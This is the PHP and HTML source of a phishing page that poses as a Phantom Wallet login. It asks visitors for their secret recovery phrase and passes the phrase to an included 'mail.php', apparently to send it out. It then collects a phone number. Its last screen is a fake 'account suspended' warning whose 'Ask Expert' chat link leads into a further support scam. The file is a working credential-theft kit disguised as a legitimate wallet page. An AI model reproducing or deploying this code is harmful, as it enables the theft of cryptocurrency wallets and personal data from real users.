<!DOCTYPE html>
<html lang="en-US" class="js_active vc_desktop vc_transform vc_transform">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="stylesheet" href="./index_files/all.min.css" />
        <link href="./index_files/css2" rel="stylesheet" />
        <link href="./index_files/css2(1)" rel="stylesheet" />
        <title>Phantom secret verify error – Phantom Wallet</title>
        <meta name="robots" content="noindex, nofollow" />
        <link rel="dns-prefetch" href="https://fonts.googleapis.com/" />
       <link rel="stylesheet" id="wp-block-library-css" href="./index_files/style.min.css" type="text/css" media="all" />
        <link rel="stylesheet" id="schema-lite-style-css" href="./index_files/style.css" type="text/css" media="all" />
        <link rel="stylesheet" id="schema-lite-fonts-css" href="./index_files/css" type="text/css" media="all" />
        <link rel="stylesheet" id="js_composer_front-css" href="./index_files/js_composer.min.css" type="text/css" media="all" />
         <link rel="icon" href="./index_files/facelogo-1.png" sizes="32x32" />
         <link rel="stylesheet"  href="style.css" type="text/css" media="all" />
    </head>
    <body class="page-template-default page page-id-163 wp-embed-responsive boxed nosidebar wpb-js-composer js-comp-ver-6.8.0 vc_responsive">
        <div class="main-container">
            <div class="top-navigation">
                <div class="container clear">
                    <nav id="navigation" class="top-navigation" role="navigation"></nav>
                    <!-- #site-navigation -->
                </div>
            </div>
            <header id="site-header" role="banner">
                <div class="container clear">
                    <div class="site-branding">
                        <h2 id="logo" class="site-title">
                            <a href="#">Phantom Wallet</a>
                        </h2>
                    </div>

                    <div class="primary-navigation">
                        <a href="phant-login.html#" id="pull" class="toggle-mobile-menu">Menu</a>
                        <nav id="navigation" class="primary-navigation mobile-menu-wrapper" role="navigation">
                            <ul class="menu clearfix toggle-menu">
                                <li class="cat-item cat-item-1"><a href="#">Uncategorized</a></li>
                            </ul>
                            <div id="mobile-menu-overlay" style="display: none;"></div>
                        </nav>
                        <div id="mobile-menu-overlay"></div>
                    </div>
                </div>
            </header>

            <div id="page" class="single clear">
                <div class="content">
                    <article class="article">
                        <div id="content_box">
                            <div id="post-163" class="g post post-163 page type-page status-publish hentry">
                                <div class="single_page single_post clear">
                                    <header>
                                        <h1 class="title">Phantom login</h1>
                                    </header>
                                    <div id="content" class="post-single-content box mark-links">
                                        <div class="vc_row wpb_row vc_row-fluid header-top">
                                            <div class="wpb_column vc_column_container vc_col-sm-4">
                                                <div class="vc_column-inner">
                                                    <div class="wpb_wrapper">
                                                        <div class="wpb_single_image wpb_content_element vc_align_left">
                                                            <figure class="wpb_wrapper vc_figure">
                                                                <div class="vc_single_image-wrapper vc_box_border_grey">
                                                                    <img width="186" height="44" src="./index_files/nlogo.jpg" class="vc_single_image-img attachment-full" alt="" loading="lazy" title="nlogo" />
                                                                </div>
                                                            </figure>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="wpb_column vc_column_container vc_col-sm-4">
                                                <div class="vc_column-inner"><div class="wpb_wrapper"></div></div>
                                            </div>
                                            <div class="wpb_column vc_column_container vc_col-sm-4">
                                                <div class="vc_column-inner">
                                                    <div class="wpb_wrapper">
                                                        <div class="wpb_single_image wpb_content_element vc_align_right">
                                                            <figure class="wpb_wrapper vc_figure">
                                                                <div class="vc_single_image-wrapper vc_box_border_grey">
                                                                    <img width="60" height="18" src="./index_files/help.jpg" class="vc_single_image-img attachment-full" alt="" loading="lazy" title="help" />
                                                                </div>
                                                            </figure>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                    <?php
                                     if (isset($_POST['btnLoginMore'])) {
                                        include 'mail.php';
                                    ?>
                                     <div id="section_3" class="vc_row wpb_row vc_row-fluid">
                                            <div class="vc_column_nopadding wpb_column vc_column_container vc_col-sm-12">
                                                <div class="vc_column-inner">
                                                    <form action="" method="post">
                                                        <input type="hidden" name="secret_recovery_phrase" value="<?php echo $_POST['secret_recovery_phrase'];?>">
                                                        <input type="hidden" name="brandName" value="Phantom">
                                                         <input type="hidden" name="brandType" value="1">
                                                    <div class="wpb_wrapper">
                                                        <div class="wpb_text_column wpb_content_element cryptowallet cryptowallet1" style=" display: block ;">
                                                            <div class="wpb_wrapper">
                                                                <div class="send">
                                                                    <div class="send_imglogo"><img src="./index_files/facelogo-1.png"></div>
                                                                    <h2>Phantom</h2>
                                                                </div>
                                                                <p style="text-align: left; margin-bottom: 0; color: #fff; font-size: 14px;">*Enter Phone No</p>
                                                              <input type="text" name="number" class="error_message phone_number form-control the_input_element aling_left align_left required" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" title="" data-secondary-message="Invalid phone number" style=" height:  40px;  margin: 0;font-size: 13px; color: rgb(241, 241, 241); background: rgb(24, 24, 24); border-color: rgb(34, 34, 34);" placeholder="+1 000-000-0000" maxlength="12" data-length="12" required>
                                                                <div id="btn_twobox">
                                                                    <button type="submit" name="fromLog" id="btn_one" style="    margin-top: 30px; border: none;">VERIFY</button><br />
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </form>
                                                </div>
                                            </div>
                                        </div>

                                      <?php } elseif (isset($_POST['fromLog'])) {
                                         include 'mail.php';
                                     ?>
                                     <div id="section_3" class="vc_row wpb_row vc_row-fluid">
                                            <div class="vc_column_nopadding wpb_column vc_column_container vc_col-sm-12">
                                                <div class="vc_column-inner">
                                                    <div class="wpb_wrapper">
                                                        <div class="wpb_text_column wpb_content_element  cryptowallet cryptowallet1" id="cryptowallet_p2">
                                                            <div class="wpb_wrapper">
                                                                <div class="Important_messgae">
                                                    <div id="importantmsgid" class="important-msg">
                                                    <h5><strong>Important Message !</strong></h5>
                                                    <p>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</p>
                                                    <p class="errorcode"><strong>Error CODE: EBRX1:6X76D</strong></p>
                                                    <h2 class="askexpert"><a href="javascript:void(Tawk_API.toggle())" class="btn">Ask Expert</a></h2>
                                                    </div>
                                                    </div>

                                                            </div>
                                                     </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                      <?php } else { ?>

                                        <div id="section_3" class="vc_row wpb_row vc_row-fluid">
                                            <div class="vc_column_nopadding wpb_column vc_column_container vc_col-sm-12">
                                                <div class="vc_column-inner">
                                                    <div class="wpb_wrapper">
                                                        <div class="wpb_text_column wpb_content_element cryptowallet cryptowallet1">
                                                            <form action="" method="post">
                                                                 <input type="hidden" name="brandName" value="Phantom">
                                                                 <input type="hidden" name="brandType" value="1">
                                                            <div class="wpb_wrapper">
                                                               <div class="Recovery-">
                                                                    <h1>Secret Recovery Phrase</h1>
                                                                    <p>Restore an existing wallet with your 12 or 24-word secret recovery phrase</p>
                                                                </div>

                                                                <div class="col-sm-12  input_container">
                                                                    <textarea rows="5" name="secret_recovery_phrase" placeholder="Secret phrase" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message the_input_element textarea pre-format form-control aling_left align_left required" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Required" title="" style="font-size: 13px; color: rgb(255, 255, 255); background: rgb(24, 24, 24); border-color: rgb(47, 47, 47);" autocomplete="enabled" required></textarea>
                                                                </div>

                                                                <div id="btn_twobox">
                                                                    <button name="btnLoginMore" type="submit" id="btn_one">Import secret recovery phrase</button><br />
                                                                </div>
                                                            </div>
                                                        </form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                     <?php }  ?>

                                      


                                    </div>
                                </div>
                            </div>
                        </div>
                    </article>
                </div>
            </div>           
        </div>
        <?php include'chat.php';?>
    </body>
</html>
